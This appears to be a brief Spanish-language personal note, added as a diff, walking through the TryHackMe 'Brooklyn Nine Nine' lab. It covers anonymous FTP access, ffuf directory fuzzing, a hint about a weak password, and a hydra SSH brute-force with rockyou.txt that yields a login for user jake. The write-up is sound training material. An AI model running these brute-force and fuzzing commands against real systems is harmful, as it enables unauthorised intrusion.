@@ -1,0 +1,12 @@
+# Brooklyn Nine Nine
+- THM
+- 10.128.159.199
+- 21 ftp anonymous -> 22,80
+- ffuf -u http://10.128.159.199/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+- analizando el código steganography !! es solo uan foto la web.
+- de amy -> 3 │ Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine ( trayendo el archivo desde ftp get)
+- http://10.128.159.199/brooklyn99.jpg si abro la imagen en otro lado. -> me guardo la imagen.
+- file, exiftool intento sacar info por estenografia no logro encontrar nada.
+- hacemos fuerza bruta al user ssh -> ❯ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.128.159.199
+- [22][ssh] host: 10.128.159.199   login: jake   password: X jee :)
+- ssh jake@10.128.159.199 entramos
